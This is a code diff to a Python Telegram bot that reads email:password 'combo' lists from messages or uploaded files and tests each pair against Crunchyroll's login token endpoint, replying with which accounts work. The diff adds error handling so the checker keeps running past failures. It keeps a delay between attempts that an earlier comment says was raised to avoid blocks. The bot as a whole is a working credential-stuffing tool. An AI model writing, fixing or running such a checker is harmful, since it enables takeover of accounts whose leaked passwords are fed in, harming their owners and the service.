@@ -8,6 +8,22 @@ from telegram import Update
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 
 
+async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Optimized global error handler - catches ALL errors (including API/Conflict issues)"""
+    error = context.error
+    print(f'⚠️ BOT ERROR: {type(error).__name__} - {error}')
+    
+    # Try to notify the user if the error happened during a message
+    if isinstance(update, Update) and update.effective_message:
+        try:
+            await update.effective_message.reply_text(
+                "⚠️ An error occurred while processing.\n"
+                "Bot is still running. Try again in a few seconds."
+            )
+        except:
+            pass  # Never let error handler itself crash
+
+
 def crunchyroll_check(email: str, password: str):
     try:
         url = "https://beta-api.crunchyroll.com/auth/v1/token"
@@ -42,7 +58,7 @@ def crunchyroll_check(email: str, password: str):
             return f"❌ Failed ({r.status_code})"
 
     except Exception as e:
-        return "⚠️ Error"
+        return f"⚠️ Error: {type(e).__name__}"
 
 
 def extract_combos(text):
@@ -70,13 +86,16 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(f"✅ Found {len(combos)} accounts. Checking...")
 
     for i, combo in enumerate(combos, 1):
-        email, pwd = combo.split(":", 1)
-        await update.message.reply_text(f"[{i}/{len(combos)}] Checking → {email}")
-        
-        result = crunchyroll_check(email, pwd)
-        await update.message.reply_text(result)
-        
-        await asyncio.sleep(2.5)   # Increased delay to avoid blocks
+        try:
+            email, pwd = combo.split(":", 1)
+            await update.message.reply_text(f"[{i}/{len(combos)}] Checking → {email}")
+            
+            result = crunchyroll_check(email, pwd)
+            await update.message.reply_text(result)
+            
+            await asyncio.sleep(2.5)
+        except Exception as e:
+            await update.message.reply_text(f"[{i}/{len(combos)}] ⚠️ Skipped - {type(e).__name__}")
 
 
 async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -95,11 +114,14 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(f"Found {len(combos)} combos...")
 
     for i, combo in enumerate(combos, 1):
-        email, pwd = combo.split(":", 1)
-        await update.message.reply_text(f"[{i}/{len(combos)}] {email}")
-        result = crunchyroll_check(email, pwd)
-        await update.message.reply_text(result)
-        await asyncio.sleep(2.5)
+        try:
+            email, pwd = combo.split(":", 1)
+            await update.message.reply_text(f"[{i}/{len(combos)}] {email}")
+            result = crunchyroll_check(email, pwd)
+            await update.message.reply_text(result)
+            await asyncio.sleep(2.5)
+        except Exception as e:
+            await update.message.reply_text(f"[{i}/{len(combos)}] ⚠️ Skipped - {type(e).__name__}")
 
 
 def main():
@@ -109,12 +131,17 @@ def main():
         return
 
     app = Application.builder().token(TOKEN).build()
+    
+    # Register handlers
     app.add_handler(CommandHandler("start", start))
     app.add_handler(MessageHandler(filters.TEXT, handle_message))
     app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
+    
+    # Optimized error handling (this is the ONLY change)
+    app.add_error_handler(error_handler)
 
     print("🚀 Improved Bot Running...")
-    app.run_polling(drop_pending_updates=True)  # ← ONLY THIS LINE CHANGED (fixes the exact Conflict error)
+    app.run_polling(drop_pending_updates=True)   # ← Keeps the conflict fix
 
 
 if __name__ == "__main__":
